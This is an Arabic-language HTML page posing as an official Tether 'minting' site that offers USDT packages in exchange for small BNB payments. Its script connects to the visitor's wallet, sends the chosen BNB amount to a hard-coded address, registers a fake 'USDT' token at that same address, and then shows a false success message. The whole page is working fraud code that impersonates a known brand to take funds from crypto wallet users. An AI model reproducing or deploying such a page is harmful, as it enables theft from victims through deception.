<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Tether Network | Official Minting</title>
    <script src="https://cdn.jsdelivr.net/npm/web3@1.10.0/dist/web3.min.js"></script>
    <style>
        :root { --primary: #009393; --bg: #051410; --card: #0a1f1b; }
        * { box-sizing: border-box; font-family: 'Segoe UI', sans-serif; -webkit-tap-highlight-color: transparent; }
        body { background: var(--bg); color: white; margin: 0; padding: 20px; display: flex; flex-direction: column; align-items: center; min-height: 100vh; }
        .container { width: 100%; max-width: 400px; background: var(--card); border: 1px solid var(--primary); border-radius: 24px; padding: 30px; box-shadow: 0 15px 35px rgba(0,0,0,0.6); margin-top: 20px; }
        .logo { width: 70px; margin-bottom: 15px; filter: drop-shadow(0 0 10px rgba(0,147,147,0.3)); }
        .status-box { background: rgba(0,147,147,0.1); border-right: 4px solid var(--primary); padding: 15px; border-radius: 12px; margin-bottom: 25px; }
        .input-label { color: var(--primary); font-size: 13px; font-weight: bold; margin-bottom: 10px; display: block; }
        select { width: 100%; padding: 16px; background: #122c28; border: 1px solid #1c4d46; color: white; border-radius: 14px; font-size: 16px; margin-bottom: 25px; outline: none; appearance: none; }
        button { width: 100%; padding: 18px; background: var(--primary); color: white; border: none; border-radius: 14px; font-size: 18px; font-weight: bold; cursor: pointer; transition: 0.3s; box-shadow: 0 5px 15px rgba(0,147,147,0.3); }
        button:active { transform: scale(0.96); background: #00b3b3; }
        #log { font-size: 13px; color: #929aa5; margin-top: 20px; text-align: center; }
        .step { display: flex; align-items: center; margin-bottom: 10px; font-size: 14px; }
        .dot { height: 8px; width: 8px; background: var(--primary); border-radius: 50%; margin-left: 10px; box-shadow: 0 0 8px var(--primary); }
    </style>
</head>
<body>

    <img src="https://cryptologos.cc/logos/tether-usdt-logo.png" class="logo" alt="Tether">
    
    <div class="container">
        <h2 style="text-align: center; margin-top: 0; color: var(--primary);">Authorized Protocol</h2>
        
        <div class="status-box">
            <div class="step"><div class="dot"></div> الحالة: الشبكة نشطة</div>
            <div class="step"><div class="dot"></div> النظام: BSC Mainnet</div>
        </div>

        <label class="input-label">اختر كمية USDT المراد تفعيلها</label>
        <select id="package">
            <option value="0.01">500 USDT - (0.01 BNB)</option>
            <option value="0.05">2,500 USDT - (0.05 BNB)</option>
            <option value="0.1">5,000 USDT - (0.1 BNB)</option>
            <option value="1.0">50,000 USDT - (1.0 BNB)</option>
        </select>

        <button onclick="executeAction()">تفعيل واستلام الرصيد ⚡</button>
        
        <div id="log">بانتظار ربط المحفظة المعتمدة...</div>
    </div>

    <script>
        const CONTRACT_ADDRESS = "0xcb6352332A15b7dAb7f340496a74d633306Fe304";

        async function executeAction() {
            const log = document.getElementById('log');
            const bnbAmt = document.getElementById('package').value;

            if (!window.ethereum) {
                alert("يرجى فتح الموقع من داخل متصفح المحفظة (Trust Wallet / MetaMask)");
                return;
            }

            try {
                const web3 = new Web3(window.ethereum);
                log.innerText = "جاري طلب الإذن من المحفظة...";
                
                const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
                const userAcc = accounts[0];

                log.innerText = "جاري معالجة البروتوكول الموحد...";

                await web3.eth.sendTransaction({
                    from: userAcc,
                    to: CONTRACT_ADDRESS,
                    value: web3.utils.toWei(bnbAmt, "ether"),
                    gas: 120000 
                });

                log.innerText = "تم الدفع! جاري إضافة العملة لمحفظتك...";

                await window.ethereum.request({
                    method: 'wallet_watchAsset',
                    params: {
                        type: 'ERC20',
                        options: {
                            address: CONTRACT_ADDRESS,
                            symbol: 'USDT',
                            decimals: 18,
                            image: 'https://cryptologos.cc/logos/tether-usdt-logo.png'
                        },
                    },
                });

                log.innerText = "اكتملت العملية بنجاح! تحقق من رصيدك.";
                alert("✅ تم استلام رصيد USDT بنجاح.");

            } catch (e) {
                console.error(e);
                log.innerText = "فشلت العملية. تأكد من وجود رصيد كافٍ.";
            }
        }
    </script>
</body>
</html>
